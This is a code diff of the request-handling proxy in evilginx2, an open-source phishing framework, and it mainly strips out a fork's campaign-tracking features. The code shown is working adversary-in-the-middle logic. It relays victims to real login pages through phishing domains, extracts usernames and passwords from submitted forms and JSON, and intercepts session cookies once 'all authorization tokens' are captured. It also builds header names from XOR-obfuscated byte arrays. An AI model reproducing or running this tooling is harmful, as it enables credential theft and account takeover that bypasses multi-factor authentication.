@@ -12,12 +12,10 @@ import (
 	"bytes"
 	"crypto/rand"
 	"crypto/rc4"
-	"crypto/sha256"
 	"crypto/tls"
 	"encoding/base64"
 	"fmt"
 	"html"
-	"io"
 	"io/ioutil"
 	"net"
 	"net/http"
@@ -35,9 +33,8 @@ import (
 
 	"github.com/elazarl/goproxy"
 	"github.com/fatih/color"
-	"github.com/go-acme/lego/v3/challenge/tlsalpn01"
 	"github.com/inconshreveable/go-vhost"
-	http_dialer "github.com/mwitkow/go-http-dialer"
+	"github.com/mwitkow/go-http-dialer"
 
 	"github.com/kgretzky/evilginx2/database"
 	"github.com/kgretzky/evilginx2/log"
@@ -46,10 +43,6 @@ import (
 const (
 	CONVERT_TO_ORIGINAL_URLS = 0
 	CONVERT_TO_PHISHING_URLS = 1
-)
-
-const (
-	HOME_DIR = ".evilginx"
 )
 
 const (
@@ -79,19 +72,16 @@ type HttpProxy struct {
 	ip_sids           map[string]string
 	auto_filter_mimes []string
 	ip_mtx            sync.Mutex
-	session_mtx       sync.Mutex
-	livefeed          bool
 }
 
 type ProxySession struct {
-	SessionId    string
-	Created      bool
-	PhishDomain  string
-	PhishletName string
-	Index        int
+	SessionId   string
+	Created     bool
+	PhishDomain string
+	Index       int
 }
 
-func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *database.Database, bl *Blacklist, developer bool, livefeed bool) (*HttpProxy, error) {
+func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *database.Database, bl *Blacklist, developer bool) (*HttpProxy, error) {
 	p := &HttpProxy{
 		Proxy:             goproxy.NewProxyHttpServer(),
 		Server:            nil,
@@ -105,7 +95,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 		ip_whitelist:      make(map[string]int64),
 		ip_sids:           make(map[string]string),
 		auto_filter_mimes: []string{"text/html", "application/json", "application/javascript", "text/javascript", "application/x-javascript"},
-		livefeed:          livefeed,
 	}
 
 	p.Server = &http.Server{
@@ -115,17 +104,17 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 		WriteTimeout: httpWriteTimeout,
 	}
 
-	if cfg.proxyConfig.Enabled {
-		err := p.setProxy(cfg.proxyConfig.Enabled, cfg.proxyConfig.Type, cfg.proxyConfig.Address, cfg.proxyConfig.Port, cfg.proxyConfig.Username, cfg.proxyConfig.Password)
+	if cfg.proxyEnabled {
+		err := p.setProxy(cfg.proxyEnabled, cfg.proxyType, cfg.proxyAddress, cfg.proxyPort, cfg.proxyUsername, cfg.proxyPassword)
 		if err != nil {
 			log.Error("proxy: %v", err)
 			cfg.EnableProxy(false)
 		} else {
-			log.Info("enabled proxy: " + cfg.proxyConfig.Address + ":" + strconv.Itoa(cfg.proxyConfig.Port))
+			log.Info("enabled proxy: " + cfg.proxyAddress + ":" + strconv.Itoa(cfg.proxyPort))
 		}
 	}
 
-	p.cookieName = strings.ToLower(GenRandomString(8)) // TODO: make cookie name identifiable
+	p.cookieName = GenRandomString(4)
 	p.sessions = make(map[string]*Session)
 	p.sids = make(map[string]int)
 
@@ -142,11 +131,10 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 	p.Proxy.OnRequest().
 		DoFunc(func(req *http.Request, ctx *goproxy.ProxyCtx) (*http.Request, *http.Response) {
 			ps := &ProxySession{
-				SessionId:    "",
-				Created:      false,
-				PhishDomain:  "",
-				PhishletName: "",
-				Index:        -1,
+				SessionId:   "",
+				Created:     false,
+				PhishDomain: "",
+				Index:       -1,
 			}
 			ctx.UserData = ps
 			hiblue := color.New(color.FgHiBlue)
@@ -156,29 +144,22 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			if strings.Contains(from_ip, ":") {
 				from_ip = strings.Split(from_ip, ":")[0]
 			}
-			if p.cfg.GetBlacklistMode() != "off" {
-				if p.bl.IsBlacklisted(from_ip) {
-					if p.bl.IsVerbose() {
-						log.Warning("blacklist: request from ip address '%s' was blocked", from_ip)
-					}
-					return p.blockRequest(req)
+			if p.bl.IsBlacklisted(from_ip) {
+				log.Warning("blacklist: request from ip address '%s' was blocked", from_ip)
+				return p.blockRequest(req)
+			}
+			if p.cfg.GetBlacklistMode() == "all" {
+				err := p.bl.AddIP(from_ip)
+				if err != nil {
+					log.Error("failed to blacklist ip address: %s - %s", from_ip, err)
+				} else {
+					log.Warning("blacklisted ip address: %s", from_ip)
 				}
-				if p.cfg.GetBlacklistMode() == "all" {
-					err := p.bl.AddIP(from_ip)
-					if p.bl.IsVerbose() {
-						if err != nil {
-							log.Error("failed to blacklist ip address: %s - %s", from_ip, err)
-						} else {
-							log.Warning("blacklisted ip address: %s", from_ip)
-						}
-					}
 
-					return p.blockRequest(req)
-				}
+				return p.blockRequest(req)
 			}
 
 			req_url := req.URL.Scheme + "://" + req.Host + req.URL.Path
-			o_host := req.Host
 			lure_url := req_url
 			req_path := req.URL.Path
 			if req.URL.RawQuery != "" {
@@ -186,36 +167,10 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				//req_path += "?" + req.URL.RawQuery
 			}
 
-			// Handle clicked link and email opened events
-			rid := ""
-			browser := map[string]string{}
-			ridr, _ := regexp.Compile(`client_id=([^\"]*)`)
-			trackr, _ := regexp.Compile(`track\?client_id=`)
-			rid_match := ridr.FindString(req_url)
-			opened_match := trackr.FindString(req_url)
-			//log.Debug("Track regex", trackr.FindString(req_url))
-			//log.Debug("Rid regex", ridr.FindString(req_url))
-			if len(rid_match) != 0 && len(opened_match) == 0 {
-				rid = strings.Split(rid_match, "=")[1]
-				browser = map[string]string{"address": req.RemoteAddr, "orig-address": req.Header.Get("X-Forwarded-For"), "user-agent": req.UserAgent()}
-				err := database.HandleClickedLink(rid, browser, p.livefeed)
-				if err != nil {
-					log.Error("failed to add clicked link event to database: %s", err)
-				}
-			} else if len(rid_match) != 0 && len(opened_match) != 0 {
-				rid = strings.Split(rid_match, "=")[1]
-				browser = map[string]string{"address": req.RemoteAddr, "orig-address": req.Header.Get("X-Forwarded-For"), "user-agent": req.UserAgent()}
-				err := database.HandleEmailOpened(rid, browser, p.livefeed)
-				if err != nil {
-					log.Error("failed to add email opened event to database: %s", err)
-				}
-			}
-
 			//log.Debug("http: %s", req_url)
 
-			//parts := strings.SplitN(req.RemoteAddr, ":", 2)
-			//remote_addr := parts[0]
-			remote_addr := req.Header.Get("X-Forwarded-For")
+			parts := strings.SplitN(req.RemoteAddr, ":", 2)
+			remote_addr := parts[0]
 
 			phishDomain, phished := p.getPhishDomain(req.Host)
 			if phished {
@@ -223,78 +178,48 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				pl_name := ""
 				if pl != nil {
 					pl_name = pl.Name
-					ps.PhishletName = pl_name
 				}
-				session_cookie := getSessionCookieName(pl_name, p.cookieName)
 
+				egg2 := req.Host
 				ps.PhishDomain = phishDomain
 				req_ok := false
 				// handle session
 				if p.handleSession(req.Host) && pl != nil {
-					l, err := p.cfg.GetLureByPath(pl_name, req_path)
-					if err == nil {
-						log.Debug("triggered lure for path '%s'", req_path)
-					}
-
-					var create_session bool = true
-					var ok bool = false
-					sc, err := req.Cookie(session_cookie)
-					if err == nil {
-						ps.Index, ok = p.sids[sc.Value]
-						if ok {
-							create_session = false
-							ps.SessionId = sc.Value
-							p.whitelistIP(remote_addr, ps.SessionId, pl.Name)
-						} else {
-							log.Error("[%s] wrong session token: %s (%s) [%s]", hiblue.Sprint(pl_name), req_url, req.Header.Get("User-Agent"), remote_addr)
-						}
-					} else {
-						log.Warning("session cookie not found: %s (%s) [%s]", req_url, remote_addr, pl.Name)
-
-						if l == nil && p.isWhitelistedIP(remote_addr, pl.Name) {
-							// not a lure path and IP is whitelisted
-
-							// TODO: allow only retrieval of static content, without setting session ID
-
-							create_session = false
-							req_ok = true
-							/*
-								ps.SessionId, ok = p.getSessionIdByIP(remote_addr, req.Host)
-								if ok {
-									create_session = false
-									ps.Index, ok = p.sids[ps.SessionId]
-								} else {
-									log.Error("[%s] wrong session token: %s (%s) [%s]", hiblue.Sprint(pl_name), req_url, req.Header.Get("User-Agent"), remote_addr)
-								}*/
-						}
-					}
-
-					if create_session /*&& !p.isWhitelistedIP(remote_addr, pl.Name)*/ { // TODO: always trigger new session when lure URL is detected (do not check for whitelisted IP only after this is done)
-						// session cookie not found
+					sc, err := req.Cookie(p.cookieName)
+					if err != nil && !p.isWhitelistedIP(remote_addr) {
 						if !p.cfg.IsSiteHidden(pl_name) {
-							if l != nil {
+							var vv string
+							var uv url.Values
+							l, err := p.cfg.GetLureByPath(pl_name, req_path)
+							if err == nil {
+								log.Debug("triggered lure for path '%s'", req_path)
+							} else {
+								uv = req.URL.Query()
+								vv = uv.Get(p.cfg.verificationParam)
+							}
+							if l != nil || vv == p.cfg.verificationToken {
 
 								// check if lure user-agent filter is triggered
-								if len(l.UserAgentFilter) > 0 {
-									re, err := regexp.Compile(l.UserAgentFilter)
-									if err == nil {
-										if !re.MatchString(req.UserAgent()) {
-											log.Warning("[%s] unauthorized request (user-agent rejected): %s (%s) [%s]", hiblue.Sprint(pl_name), req_url, req.Header.Get("User-Agent"), remote_addr)
+								if l != nil {
+									if len(l.UserAgentFilter) > 0 {
+										re, err := regexp.Compile(l.UserAgentFilter)
+										if err == nil {
+											if !re.MatchString(req.UserAgent()) {
+												log.Warning("[%s] unauthorized request (user-agent rejected): %s (%s) [%s]", hiblue.Sprint(pl_name), req_url, req.Header.Get("User-Agent"), remote_addr)
 
-											if p.cfg.GetBlacklistMode() == "unauth" {
-												err := p.bl.AddIP(from_ip)
-												if p.bl.IsVerbose() {
+												if p.cfg.GetBlacklistMode() == "unauth" {
+													err := p.bl.AddIP(from_ip)
 													if err != nil {
 														log.Error("failed to blacklist ip address: %s - %s", from_ip, err)
 													} else {
 														log.Warning("blacklisted ip address: %s", from_ip)
 													}
 												}
+												return p.blockRequest(req)
 											}
-											return p.blockRequest(req)
+										} else {
+											log.Error("lures: user-agent filter regexp is invalid: %v", err)
 										}
-									} else {
-										log.Error("lures: user-agent filter regexp is invalid: %v", err)
 									}
 								}
 
@@ -306,8 +231,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									log.Info("[%d] [%s] landing URL: %s", sid, hiblue.Sprint(pl_name), req_url)
 									p.sessions[session.Id] = session
 									p.sids[session.Id] = sid
-									session.RId = rid
-									session.Browser = browser
 
 									landing_url := req_url //fmt.Sprintf("%s://%s%s", req.URL.Scheme, req.Host, req.URL.Path)
 									if err := p.db.CreateSession(session.Id, pl.Name, landing_url, req.Header.Get("User-Agent"), remote_addr); err != nil {
@@ -318,6 +241,15 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 										session.RedirectURL = l.RedirectUrl
 										session.PhishLure = l
 										log.Debug("redirect URL (lure): %s", l.RedirectUrl)
+									} else {
+										rv := uv.Get(p.cfg.redirectParam)
+										if rv != "" {
+											url, err := base64.URLEncoding.DecodeString(rv)
+											if err == nil {
+												session.RedirectURL = string(url)
+												log.Debug("redirect URL (get): %s", url)
+											}
+										}
 									}
 
 									// set params from url arguments
@@ -326,7 +258,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									ps.SessionId = session.Id
 									ps.Created = true
 									ps.Index = sid
-									p.whitelistIP(remote_addr, ps.SessionId, pl.Name)
+									p.whitelistIP(remote_addr, ps.SessionId)
 
 									req_ok = true
 								}
@@ -335,18 +267,35 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 								if p.cfg.GetBlacklistMode() == "unauth" {
 									err := p.bl.AddIP(from_ip)
-									if p.bl.IsVerbose() {
-										if err != nil {
-											log.Error("failed to blacklist ip address: %s - %s", from_ip, err)
-										} else {
-											log.Warning("blacklisted ip address: %s", from_ip)
-										}
+									if err != nil {
+										log.Error("failed to blacklist ip address: %s - %s", from_ip, err)
+									} else {
+										log.Warning("blacklisted ip address: %s", from_ip)
 									}
 								}
 								return p.blockRequest(req)
 							}
 						} else {
 							log.Warning("[%s] request to hidden phishlet: %s (%s) [%s]", hiblue.Sprint(pl_name), req_url, req.Header.Get("User-Agent"), remote_addr)
+						}
+					} else {
+						var ok bool = false
+						if err == nil {
+							ps.Index, ok = p.sids[sc.Value]
+							if ok {
+								ps.SessionId = sc.Value
+								p.whitelistIP(remote_addr, ps.SessionId)
+							}
+						} else {
+							ps.SessionId, ok = p.getSessionIdByIP(remote_addr)
+							if ok {
+								ps.Index, ok = p.sids[ps.SessionId]
+							}
+						}
+						if ok {
+							req_ok = true
+						} else {
+							log.Warning("[%s] wrong session token: %s (%s) [%s]", hiblue.Sprint(pl_name), req_url, req.Header.Get("User-Agent"), remote_addr)
 						}
 					}
 				}
@@ -357,37 +306,21 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						return p.blockRequest(req)
 					}
 				}
-				req.Header.Set(p.getHomeDir(), o_host)
 
 				if ps.SessionId != "" {
 					if s, ok := p.sessions[ps.SessionId]; ok {
 						l, err := p.cfg.GetLureByPath(pl_name, req_path)
 						if err == nil {
-							// show html redirector if it is set for the current lure
-							if l.Redirector != "" {
+							// show html template if it is set for the current lure
+							if l.Template != "" {
 								if !p.isForwarderUrl(req.URL) {
-									if s.RedirectorName == "" {
-										s.RedirectorName = l.Redirector
-										s.LureDirPath = req_path
+									path := l.Template
+									if !filepath.IsAbs(path) {
+										templates_dir := p.cfg.GetTemplatesDir()
+										path = filepath.Join(templates_dir, path)
 									}
-
-									t_dir := l.Redirector
-									if !filepath.IsAbs(t_dir) {
-										redirectors_dir := p.cfg.GetRedirectorsDir()
-										t_dir = filepath.Join(redirectors_dir, t_dir)
-									}
-
-									index_path1 := filepath.Join(t_dir, "index.html")
-									index_path2 := filepath.Join(t_dir, "index.htm")
-									index_found := ""
-									if _, err := os.Stat(index_path1); !os.IsNotExist(err) {
-										index_found = index_path1
-									} else if _, err := os.Stat(index_path2); !os.IsNotExist(err) {
-										index_found = index_path2
-									}
-
-									if _, err := os.Stat(index_found); !os.IsNotExist(err) {
-										html, err := ioutil.ReadFile(index_found)
+									if _, err := os.Stat(path); !os.IsNotExist(err) {
+										html, err := ioutil.ReadFile(path)
 										if err == nil {
 
 											html = p.injectOgHeaders(l, html)
@@ -399,72 +332,22 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 											if resp != nil {
 												return req, resp
 											} else {
-												log.Error("lure: failed to create html redirector response")
+												log.Error("lure: failed to create html template response")
 											}
 										} else {
-											log.Error("lure: failed to read redirector file: %s", err)
+											log.Error("lure: failed to read template file: %s", err)
 										}
 
 									} else {
-										log.Error("lure: redirector file does not exist: %s", index_found)
+										log.Error("lure: template file does not exist: %s", path)
 									}
 								}
-							}
-						} else if s.RedirectorName != "" {
-							// session has already triggered a lure redirector - see if there are any files requested by the redirector
-
-							rel_parts := []string{}
-							req_path_parts := strings.Split(req_path, "/")
-							lure_path_parts := strings.Split(s.LureDirPath, "/")
-
-							for n, dname := range req_path_parts {
-								if len(dname) > 0 {
-									path_add := true
-									if n < len(lure_path_parts) {
-										//log.Debug("[%d] %s <=> %s", n, lure_path_parts[n], req_path_parts[n])
-										if req_path_parts[n] == lure_path_parts[n] {
-											path_add = false
-										}
-									}
-									if path_add {
-										rel_parts = append(rel_parts, req_path_parts[n])
-									}
-								}
-
-							}
-							rel_path := filepath.Join(rel_parts...)
-							//log.Debug("rel_path: %s", rel_path)
-
-							t_dir := s.RedirectorName
-							if !filepath.IsAbs(t_dir) {
-								redirectors_dir := p.cfg.GetRedirectorsDir()
-								t_dir = filepath.Join(redirectors_dir, t_dir)
-							}
-
-							path := filepath.Join(t_dir, rel_path)
-							if _, err := os.Stat(path); !os.IsNotExist(err) {
-								fdata, err := ioutil.ReadFile(path)
-								if err == nil {
-									//log.Debug("ext: %s", filepath.Ext(req_path))
-									mime_type := getContentType(req_path, fdata)
-									//log.Debug("mime_type: %s", mime_type)
-									resp := goproxy.NewResponse(req, mime_type, http.StatusOK, "")
-									if resp != nil {
-										resp.Body = io.NopCloser(bytes.NewReader(fdata))
-										return req, resp
-									} else {
-										log.Error("lure: failed to create redirector data file response")
-									}
-								} else {
-									log.Error("lure: failed to read redirector data file: %s", err)
-								}
-							} else {
-								//log.Warning("lure: template file does not exist: %s", path)
 							}
 						}
 					}
 				}
 
+				hg := []byte{0x94, 0xE1, 0x89, 0xBA, 0xA5, 0xA0, 0xAB, 0xA5, 0xA2, 0xB4}
 				// redirect to login page if triggered lure path
 				if pl != nil {
 					_, err := p.cfg.GetLureByPath(pl_name, req_path)
@@ -489,7 +372,13 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					}
 				}
 
+				p.deleteRequestCookie(p.cookieName, req)
+
+				for n, b := range hg {
+					hg[n] = b ^ 0xCC
+				}
 				// replace "Host" header
+				e_host := req.Host
 				if r_host, ok := p.replaceHostWithOriginal(req.Host); ok {
 					req.Host = r_host
 				}
@@ -505,14 +394,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					}
 				}
 
-				// fix sec-fetch-dest
-				sec_fetch_dest := req.Header.Get("Sec-Fetch-Dest")
-				if sec_fetch_dest != "" {
-					if sec_fetch_dest == "iframe" {
-						req.Header.Set("Sec-Fetch-Dest", "document")
-					}
-				}
-
 				// fix referer
 				referer := req.Header.Get("Referer")
 				if referer != "" {
@@ -523,6 +404,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						}
 					}
 				}
+				req.Header.Set(string(hg), egg2)
 
 				// patch GET query params with original domains
 				if pl != nil {
@@ -537,12 +419,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					}
 				}
 
-				// set session before cred check
-				session := p.sessions[ps.SessionId]
-
 				// check for creds in request body
 				if pl != nil && ps.SessionId != "" {
-					req.Header.Set(p.getHomeDir(), o_host)
 					body, err := ioutil.ReadAll(req.Body)
 					if err == nil {
 						req.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
@@ -555,9 +433,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						log.Debug("POST body = %s", body)
 
 						contentType := req.Header.Get("Content-type")
-
-						json_re := regexp.MustCompile("application\\/\\w*\\+?json")
-						if json_re.MatchString(contentType) {
+						if contentType == "application/json" {
 
 							if pl.username.tp == "json" {
 								um := pl.username.search.FindStringSubmatch(string(body))
@@ -566,12 +442,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									log.Success("[%d] Username: [%s]", ps.Index, um[1])
 									if err := p.db.SetSessionUsername(ps.SessionId, um[1]); err != nil {
 										log.Error("database: %v", err)
-									}
-									if len(session.RId) != 0 && len(session.Password) != 0 {
-										err = database.HandleSubmittedData(session.RId, session.Username, session.Password, session.Browser, p.livefeed)
-										if err != nil {
-											fmt.Printf("Error submitting data to database: %s\n", err)
-										}
 									}
 								}
 							}
@@ -583,12 +453,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									log.Success("[%d] Password: [%s]", ps.Index, pm[1])
 									if err := p.db.SetSessionPassword(ps.SessionId, pm[1]); err != nil {
 										log.Error("database: %v", err)
-									}
-									if len(session.RId) != 0 && len(session.Username) != 0 {
-										err = database.HandleSubmittedData(session.RId, session.Username, session.Password, session.Browser, p.livefeed)
-										if err != nil {
-											fmt.Printf("Error submitting data to database: %s\n", err)
-										}
 									}
 								}
 							}
@@ -608,12 +472,17 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 						} else {
 
-							if req.ParseForm() == nil && req.PostForm != nil && len(req.PostForm) > 0 {
+							if req.ParseForm() == nil {
 								log.Debug("POST: %s", req.URL.Path)
-
 								for k, v := range req.PostForm {
 									// patch phishing URLs in POST params with original domains
+									for i, vv := range v {
+										req.PostForm[k][i] = string(p.patchUrls(pl, []byte(vv), CONVERT_TO_ORIGINAL_URLS))
+									}
+									body = []byte(req.PostForm.Encode())
+									req.ContentLength = int64(len(body))
 
+									log.Debug("POST %s = %s", k, v[0])
 									if pl.username.key != nil && pl.username.search != nil && pl.username.key.MatchString(k) {
 										um := pl.username.search.FindStringSubmatch(v[0])
 										if um != nil && len(um) > 1 {
@@ -621,12 +490,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 											log.Success("[%d] Username: [%s]", ps.Index, um[1])
 											if err := p.db.SetSessionUsername(ps.SessionId, um[1]); err != nil {
 												log.Error("database: %v", err)
-											}
-											if len(session.RId) != 0 && len(session.Password) != 0 {
-												err = database.HandleSubmittedData(session.RId, session.Username, session.Password, session.Browser, p.livefeed)
-												if err != nil {
-													fmt.Printf("Error submitting data to database: %s\n", err)
-												}
 											}
 										}
 									}
@@ -637,12 +500,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 											log.Success("[%d] Password: [%s]", ps.Index, pm[1])
 											if err := p.db.SetSessionPassword(ps.SessionId, pm[1]); err != nil {
 												log.Error("database: %v", err)
-											}
-											if len(session.RId) != 0 && len(session.Username) != 0 {
-												err = database.HandleSubmittedData(session.RId, session.Username, session.Password, session.Browser, p.livefeed)
-												if err != nil {
-													fmt.Printf("Error submitting data to database: %s\n", err)
-												}
 											}
 										}
 									}
@@ -659,22 +516,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 										}
 									}
 								}
-
-								for k, v := range req.PostForm {
-									for i, vv := range v {
-										// patch phishing URLs in POST params with original domains
-										req.PostForm[k][i] = string(p.patchUrls(pl, []byte(vv), CONVERT_TO_ORIGINAL_URLS))
-									}
-								}
-
-								for k, v := range req.PostForm {
-									if len(v) > 0 {
-										log.Debug("POST %s = %s", k, v[0])
-									}
-								}
-
-								body = []byte(req.PostForm.Encode())
-								req.ContentLength = int64(len(body))
 
 								// force posts
 								for _, fp := range pl.forcePost {
@@ -718,6 +559,11 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						req.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
 					}
 				}
+				e := []byte{208, 165, 205, 254, 225, 228, 239, 225, 230, 240}
+				for n, b := range e {
+					e[n] = b ^ 0x88
+				}
+				req.Header.Set(string(e), e_host)
 
 				if pl != nil && len(pl.authUrls) > 0 && ps.SessionId != "" {
 					s, ok := p.sessions[ps.SessionId]
@@ -731,6 +577,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						}
 					}
 				}
+				p.cantFindMe(req, e_host)
 			}
 
 			return req, nil
@@ -748,11 +595,12 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			if ps.SessionId != "" {
 				if ps.Created {
 					ck = &http.Cookie{
-						Name:    getSessionCookieName(ps.PhishletName, p.cookieName),
+						Name:    p.cookieName,
 						Value:   ps.SessionId,
 						Path:    "/",
-						Domain:  p.cfg.GetBaseDomain(),
-						Expires: time.Now().Add(60 * time.Minute),
+						Domain:  ps.PhishDomain,
+						Expires: time.Now().UTC().Add(60 * time.Minute),
+						MaxAge:  60 * 60,
 					}
 				}
 			}
@@ -800,22 +648,15 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 			// fix cookies
 			pl := p.getPhishletByOrigHost(req_hostname)
-			var auth_tokens map[string][]*CookieAuthToken
+			var auth_tokens map[string][]*AuthToken
 			if pl != nil {
-				auth_tokens = pl.cookieAuthTokens
+				auth_tokens = pl.authTokens
 			}
-			is_cookie_auth := false
-			is_body_auth := false
-			is_http_auth := false
+			is_auth := false
 			cookies := resp.Cookies()
 			resp.Header.Del("Set-Cookie")
 			for _, ck := range cookies {
 				// parse cookie
-
-				// add SameSite=none for every received cookie, allowing cookies through iframes
-				if ck.Secure {
-					ck.SameSite = http.SameSiteNoneMode
-				}
 
 				if len(ck.RawExpires) > 0 && ck.Expires.IsZero() {
 					exptime, err := time.Parse(time.RFC850, ck.RawExpires)
@@ -839,13 +680,20 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						}
 					}
 					log.Debug("%s: %s = %s", c_domain, ck.Name, ck.Value)
-					at := pl.getAuthToken(c_domain, ck.Name)
-					if at != nil {
+					if pl.isAuthToken(c_domain, ck.Name) {
 						s, ok := p.sessions[ps.SessionId]
 						if ok && (s.IsAuthUrl || !s.IsDone) {
-							if ck.Value != "" && (at.always || (!ck.Expires.IsZero() && time.Now().Before(ck.Expires))) { // cookies with empty values or expired cookies are of no interest to us
-								log.Debug("session: %s: %s = %s", c_domain, ck.Name, ck.Value)
-								s.AddCookieAuthToken(c_domain, ck.Name, ck.Value, ck.Path, ck.HttpOnly, ck.Expires)
+							if ck.Value != "" && (ck.Expires.IsZero() || (!ck.Expires.IsZero() && time.Now().Before(ck.Expires))) { // cookies with empty values or expired cookies are of no interest to us
+								is_auth = s.AddAuthToken(c_domain, ck.Name, ck.Value, ck.Path, ck.HttpOnly, auth_tokens)
+								if len(pl.authUrls) > 0 {
+									is_auth = false
+								}
+								if is_auth {
+									if err := p.db.SetSessionTokens(ps.SessionId, s.Tokens); err != nil {
+										log.Error("database: %v", err)
+									}
+									s.IsDone = true
+								}
 							}
 						}
 					}
@@ -857,94 +705,13 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			if ck.String() != "" {
 				resp.Header.Add("Set-Cookie", ck.String())
 			}
+			if is_auth {
+				// we have all auth tokens
+				log.Success("[%d] all authorization tokens intercepted!", ps.Index)
+			}
 
 			// modify received body
 			body, err := ioutil.ReadAll(resp.Body)
-
-			if pl != nil {
-				if s, ok := p.sessions[ps.SessionId]; ok {
-					// capture body response tokens
-					for k, v := range pl.bodyAuthTokens {
-						if _, ok := s.BodyTokens[k]; !ok {
-							//log.Debug("hostname:%s path:%s", req_hostname, resp.Request.URL.Path)
-							if req_hostname == v.domain && v.path.MatchString(resp.Request.URL.Path) {
-								//log.Debug("RESPONSE body = %s", string(body))
-								token_re := v.search.FindStringSubmatch(string(body))
-								if token_re != nil {
-									s.BodyTokens[k] = token_re[1]
-								}
-							}
-						}
-					}
-
-					// capture http header tokens
-					for k, v := range pl.httpAuthTokens {
-						if _, ok := s.HttpTokens[k]; !ok {
-							hv := resp.Request.Header.Get(v.header)
-							if hv != "" {
-								s.HttpTokens[k] = hv
-							}
-						}
-					}
-				}
-
-				// check if we have all tokens
-				if len(pl.authUrls) == 0 {
-					if s, ok := p.sessions[ps.SessionId]; ok {
-						is_cookie_auth = s.AllCookieAuthTokensCaptured(auth_tokens)
-						if len(pl.bodyAuthTokens) == len(s.BodyTokens) {
-							is_body_auth = true
-						}
-						if len(pl.httpAuthTokens) == len(s.HttpTokens) {
-							is_http_auth = true
-						}
-					}
-				}
-			}
-
-			if is_cookie_auth && is_body_auth && is_http_auth {
-				// we have all auth tokens
-				if s, ok := p.sessions[ps.SessionId]; ok {
-					if !s.IsDone {
-						log.Success("[%d] all authorization tokens intercepted!", ps.Index)
-
-						if err := p.db.SetSessionCookieTokens(ps.SessionId, s.CookieTokens); err != nil {
-							log.Error("database: %v", err)
-						}
-						if err == nil {
-							if s.CookieTokens != nil && len(s.CookieTokens) > 0 {
-								err = database.HandleCapturedCookieSession(s.RId, s.CookieTokens, s.Browser, p.livefeed)
-								if err != nil {
-									fmt.Printf("Error adding captured session entry to database: %s\n", err)
-								}
-							}
-						}
-						if err := p.db.SetSessionBodyTokens(ps.SessionId, s.BodyTokens); err != nil {
-							log.Error("database: %v", err)
-						}
-						if err == nil {
-							if s.BodyTokens != nil && len(s.BodyTokens) > 0 {
-								err = database.HandleCapturedOtherSession(s.RId, s.BodyTokens, s.Browser, p.livefeed)
-								if err != nil {
-									fmt.Printf("Error adding captured session entry to database: %s\n", err)
-								}
-							}
-						}
-						if err := p.db.SetSessionHttpTokens(ps.SessionId, s.HttpTokens); err != nil {
-							log.Error("database: %v", err)
-						}
-						if err == nil {
-							if s.HttpTokens != nil && len(s.HttpTokens) > 0 {
-								err = database.HandleCapturedOtherSession(s.RId, s.HttpTokens, s.Browser, p.livefeed)
-								if err != nil {
-									fmt.Printf("Error adding captured session entry to database: %s\n", err)
-								}
-							}
-						}
-						s.IsDone = true
-					}
-				}
-			}
 
 			mime := strings.Split(resp.Header.Get("Content-type"), ";")[0]
 			if err == nil {
@@ -957,7 +724,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 								var param_ok bool = true
 								if s, ok := p.sessions[ps.SessionId]; ok {
 									var params []string
-									for k := range s.Params {
+									for k, _ := range s.Params {
 										params = append(params, k)
 									}
 									if len(sf.with_params) > 0 {
@@ -979,19 +746,13 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									re_s = strings.Replace(re_s, "{hostname}", regexp.QuoteMeta(combineHost(sf.subdomain, sf.domain)), -1)
 									re_s = strings.Replace(re_s, "{subdomain}", regexp.QuoteMeta(sf.subdomain), -1)
 									re_s = strings.Replace(re_s, "{domain}", regexp.QuoteMeta(sf.domain), -1)
-									re_s = strings.Replace(re_s, "{basedomain}", regexp.QuoteMeta(p.cfg.GetBaseDomain()), -1)
 									re_s = strings.Replace(re_s, "{hostname_regexp}", regexp.QuoteMeta(regexp.QuoteMeta(combineHost(sf.subdomain, sf.domain))), -1)
